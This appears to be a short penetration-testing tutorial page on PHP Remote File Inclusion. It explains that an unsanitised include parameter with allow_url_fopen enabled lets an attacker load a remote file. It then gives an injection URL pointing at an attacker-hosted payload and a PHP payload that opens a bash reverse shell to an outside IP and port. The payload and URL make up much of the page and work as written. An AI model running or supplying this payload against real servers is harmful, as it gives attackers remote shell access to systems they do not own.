---
sidebar_position: 3
---

# Remote File Inclusion (RFI)

:::info This Section Covers `PHP` File Inclusion


:::

<br/>

RFI is a technique to **`Include Remote Files`** and into a Vulnerable Application. RFI occurs when the User Input is not properly Sanitized. This allows an Attacker to Inject an external URL into **`include`** function. One requirement for RFI is that the **`allow_url_fopen`** option needs to be ON.



## How It Works

- <b style={{ color: 'Orange' }}>Request:</b> We can Inject the malicious URL, which points to the our Server that contains a PAYLOAD.
- The Server can be Hosted with `Python`

```
+-----------------------------------------------------------------------+
| URL: | http://website.com/get.php?file=http://10.6.10.5/PAYLOAD.php | 
+-----------------------------------------------------------------------+
```

- Simple `PHP` PAYLOAD

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.6.10.5/8888 0>&1'");
```